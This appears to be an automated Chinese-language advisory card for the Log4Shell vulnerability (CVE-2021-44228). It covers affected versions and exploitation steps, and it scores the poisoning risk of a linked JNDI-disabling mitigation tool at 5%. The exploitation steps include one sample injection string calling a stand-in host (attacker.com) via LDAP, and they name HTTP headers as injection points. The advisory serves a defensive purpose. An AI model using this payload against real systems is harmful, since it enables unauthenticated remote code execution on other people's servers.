## CVE-2021-44228 Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的 Log4j2 版本，且允许记录用户可控的数据。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，它允许未经身份验证的攻击者执行远程代码。攻击者可以通过将恶意 JNDI 注入字符串插入到 Log4j2 记录的日志消息中来利用此漏洞。当 Log4j2 尝试解析此字符串时，它会向攻击者控制的 LDAP 或其他 JNDI 端点发起请求，从而允许攻击者执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞的 POC 代码非常有效。大量的安全厂商和研究人员都确认了此漏洞的存在和可利用性。提供的“Log4NoShell”代码实际上是一个缓解工具，通过禁用 Log4j2 的 JNDI 查找来防止漏洞被利用。它本身不是exploit，而是防御手段。

**投毒风险：**

分析提供的缓解工具代码，该代码主要功能是通过Java Agent禁用Log4j的JNDI lookup功能，本身不存在恶意代码。但是，任何第三方提供的工具都存在潜在的投毒风险。代码中使用了 ASM 字节码操作库，有一定的复杂性，增加了审查的难度。 因此，尽管表面上是防御工具，仍然存在一定的风险，建议在使用前仔细审查代码。

 风险评估：5%。

**利用方式：**

1.  攻击者识别使用易受攻击的 Log4j2 版本的应用程序。
2.  攻击者将包含恶意 JNDI 注入字符串（例如 `${jndi:ldap://attacker.com/evil}`）的输入发送到应用程序，确保该输入会被 Log4j2 记录下来。输入的途径包括但不限于：HTTP头（User-Agent, X-Forwarded-For等），POST请求体，URL参数等
3.  Log4j2 尝试解析该字符串，并向攻击者控制的 LDAP 服务器发起请求。
4.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，从而允许攻击者执行任意代码。

**项目地址:** [winnpixie/log4noshell](https://github.com/winnpixie/log4noshell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)